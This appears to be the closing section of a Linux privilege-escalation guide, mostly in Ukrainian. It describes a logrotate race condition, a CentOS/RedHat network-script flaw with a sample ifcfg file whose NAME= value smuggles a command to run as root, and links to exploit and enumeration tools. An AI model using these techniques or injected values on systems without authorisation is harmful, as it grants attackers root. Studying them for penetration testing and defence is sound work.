> Ця вразливість впливає на `logrotate` версії `3.18.0` та старіші

Більш детальну інформацію про вразливість можна знайти на сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ви можете експлуатувати цю вразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця вразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тому коли ви знаходите можливість змінювати логи, перевірте, хто керує цими логами, і чи можна підвищити привілеї, підставивши логи як symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з будь-якої причини користувач може **записати** скрипт `ifcf-<whatever>` у _/etc/sysconfig/network-scripts_ **або** може **змінити** існуючий — то ваша **system is pwned**.

Network scripts, _ifcg-eth0_ наприклад, використовуються для мережевих з’єднань. Вони виглядають точно як .INI файли. Однак вони ~sourced~ на Linux за допомогою Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` у цих network scripts обробляється некоректно. Якщо в імені є **пробіл/порожній символ, система намагається виконати частину після пробілу**. Це означає, що **все після першого пробілу виконується як root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network та /bin/id_)

### **init, init.d, systemd та rc.d**

Каталог `/etc/init.d` містить **scripts** для System V init (SysVinit), **classic Linux service management system**. У ньому є скрипти для `start`, `stop`, `restart`, а іноді й `reload` сервісів. Їх можна виконувати безпосередньо або через символічні посилання в `/etc/rc?.d/`. Альтернативний шлях у системах Redhat — `/etc/rc.d/init.d`.

З іншого боку, `/etc/init` пов'язаний з **Upstart**, новішою системою **service management**, впровадженою Ubuntu, яка використовує конфігураційні файли для керування сервісами. Незважаючи на перехід на Upstart, скрипти SysVinit все ще використовуються поряд із конфігураціями Upstart через шар сумісності в Upstart.

**systemd** постає як сучасний ініціалізатор та менеджер сервісів, що пропонує розширені можливості, такі як запуск демона за вимогою, управління automount та знімки стану системи. Він організовує файли у `/usr/lib/systemd/` для пакетів дистрибутива і в `/etc/systemd/system/` для змін адміністратора, спрощуючи процес адміністрування системи.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Найкращий інструмент для пошуку Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Reference Manual – Shell Arithmetic](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)

{{#include ../../banners/hacktricks-training.md}}
